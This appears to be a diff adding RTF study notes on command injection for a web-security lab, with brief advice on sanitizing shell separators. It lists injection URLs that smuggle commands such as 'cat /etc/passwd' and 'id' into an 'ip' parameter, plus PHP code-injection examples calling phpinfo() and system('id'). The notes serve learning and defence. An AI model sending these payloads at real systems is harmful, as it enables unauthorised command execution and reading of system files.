@@ -1,0 +1,49 @@
+{\rtf1\ansi\ansicpg1252\cocoartf1404\cocoasubrtf470
+{\fonttbl\f0\fswiss\fcharset0 Helvetica;\f1\froman\fcharset0 Times-Roman;\f2\fmodern\fcharset0 Courier;
+}
+{\colortbl;\red255\green255\blue255;\red154\green154\blue154;\red0\green0\blue233;\red127\green127\blue127;
+}
+\paperw11900\paperh16840\margl1440\margr1440\vieww18080\viewh10460\viewkind0
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+
+\f0\b\fs32 \cf0 \ul \ulc0 Command Injection
+\b0 \ulnone \
+\
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+
+\f1\b\fs28 \cf0 \expnd0\expndtw0\kerning0
+Example 1
+\b0  \
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+\cf0 \cb2 \ul \ulc3 /commandexec/example1.php?ip=127.0.0.1;cat /etc/passwd;\
+/commandexec/example1.php?ip=127.0.0.1 && cat /etc/passwd;\
+/commandexec/example1.php?ip=127.0.0.1 | cat /etc/passwd;\
+example1.php?ip=127.0.0.1;id;\
+commandexec/example2.php?ip=127.0.0.1%0Aid\
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+\cf0 \cb1 \ulnone Sanitizing Input \
+\pard\pardeftab720\sl280\partightenfactor0
+
+\f2 \cf0 Replace or Ban arguments with \'93;\'94\
+Other shell escapes available	\
+Example:\
+\'96  &&	\
+\'96  |	\
+\'96  ...	  \
+\'97 %0A - newline\
+\
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+
+\f1 \cf0 As there is no input validation, the code above is vulnerable to a Command Injection attack. \
+For example: \
+\pard\pardeftab720\sl280\partightenfactor0
+
+\f2 \cf0 \cb4 /index.php?arg=1; phpinfo()\
+\cb1 \
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+
+\f1 \cf0 While exploiting bugs like these, an attacker may want to execute system commands. In this case, a code injection bug can also be used for command injection, for example: \
+\pard\pardeftab720\sl280\partightenfactor0
+
+\f2 \cf0 \cb4 /index.php?arg=1; system('id')\
+}
